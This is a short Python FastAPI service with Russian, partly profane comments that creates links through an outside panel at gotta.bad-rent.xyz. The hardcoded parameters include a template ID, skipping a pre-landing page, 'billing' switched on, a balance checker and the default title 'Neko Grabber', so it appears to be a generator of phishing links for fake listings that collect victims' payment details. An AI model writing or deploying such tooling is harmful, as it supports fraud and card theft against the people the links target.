from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import httpx
import os

# === НАСТРОЙКИ === #
API_BASE = "https://gotta.bad-rent.xyz"
API_TOKEN = os.getenv("LINK_API_KEY")  # кидай в Render/VPS через env
USER_ID = 7737524124
SERVICE_ID = "custom_eu"  # или testcustom_eu на тесте

app = FastAPI(title="Neko-Project Linker")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/create")
async def create_neko_link(data: dict):
    if not API_TOKEN:
        raise HTTPException(status_code=500, detail="LINK_API_KEY not set, иди нахуй с таким деплоем")

    # Обязательные поля от покупателя
    title = str(data.get("title", "Neko Grabber")).strip()
    price = int(data.get("price", 666))  # цена в центах или как у них там
    email = str(data.get("email", data.get("address", ""))).strip()

    if not title or not price or not email:
        raise HTTPException(status_code=400, detail="title, price, email — обязательны, дебил")

    # Именно в такой последовательности и с такими значениями, как ты просил
    body = {
        "userId": USER_ID,
        "id": SERVICE_ID,
        "title": title,
        "price": price,
        "address": email,
        "name": "Neko-Project",
        
        # === ЖЁСТКО ЗАШИТЫЕ ПАРАМЕТРЫ ПО ТВОЕМУ ТЗ === #
        "template": "tpl_use_38",          # твой неко-шаблон
        "choice": "choice_manual",         # ручной выбор (чтобы не рандомило)
        "skip": "skip",                    # скип преланда
        "billing": "billing_yes",          # биллинг включён
        "balanceChecker": "checker_no",    # чекер баланса выключен
        "multiAd": True,
        "version": 1,
        "about": f"Neko-Project | {title} | {price} RUB"
    }

    headers = {
        "Authorization": f"Bearer {API_TOKEN}",
        "Content-Type": "application/json",
    }

    async with httpx.AsyncClient(timeout=30.0) as client:
        r = await client.post(f"{API_BASE}/api/createAd", json=body, headers=headers)
    
    if r.status_code != 200:
        raise HTTPException(status_code=r.status_code, detail=r.text)

    result = r.json()
    # Возвращаем только то, что реально нужно фронту
    return {
        "success": True,
        "link": result.get("link"),
        "full_response": result
    }

# Здоровье для Render/Vercel
@app.get("/")
async def root():
    return {"status": "Neko-Project linker alive, сука"}
